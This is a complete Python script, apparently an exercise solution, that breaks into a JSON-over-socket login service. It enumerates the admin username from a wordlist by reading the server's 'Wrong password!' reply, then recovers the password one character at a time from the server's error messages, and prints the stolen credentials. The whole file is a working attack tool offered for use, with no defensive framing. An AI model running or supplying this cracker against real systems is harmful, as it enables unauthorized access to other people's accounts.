import sys
import socket
import itertools
import json

from string import ascii_lowercase, ascii_uppercase, digits

# constant parameters
MAX_PWD_LEN = 20
RECV_SIZE = 1024
PASSWORD_FILE = "passwords.txt"
ADMIN_FILE = "logins.txt"


def read_file(file):
    with open(file) as f:
        for line in f:
            yield line.strip()


def case_combinations_of(s):
    case_combinations = list(map("".join, itertools.product(*zip(s.upper(), s.lower()))))
    for candidate in list(case_combinations):
        yield candidate


def login_to_json(username, password=" "):
    login_dict = {
                    "login": username,
                    "password": password
                 }

    return json.dumps(login_dict)


def password_cracker(hostname, port):
    cracked_login = {}

    # define context manager for socket
    with socket.socket() as s:
        address = (hostname, port)
        s.connect(address)

        # find admin username
        for admin_username_guess in read_file(ADMIN_FILE):
            login_msg_json = login_to_json(admin_username_guess)
            data = login_msg_json.encode()

            s.send(data)
            response = s.recv(RECV_SIZE).decode()
            response_dict = json.loads(response)

            if response_dict["result"] == "Wrong password!":
                cracked_login["login"] = admin_username_guess
                break

        # find password
        password_candidate = []
        while True:
            for c in ascii_lowercase + ascii_uppercase + digits:
                try:
                    password_candidate.append(c)
                    password_guess = "".join(password_candidate)
                    login_msg_json = login_to_json(admin_username_guess, password_guess)

                    data = login_msg_json.encode()
                    s.send(data)

                    response = s.recv(RECV_SIZE).decode()
                    response_dict = json.loads(response)

                    if response_dict["result"] == "Exception happened during login":
                        break
                    elif response_dict["result"] == "Connection success!":
                        cracked_login["password"] = password_guess
                        print(json.dumps(cracked_login))
                        return

                    password_candidate.pop()
                except:
                    pass

# obtain input
args = sys.argv
hostname = args[1]
port = int(args[2])

password_cracker(hostname, port)
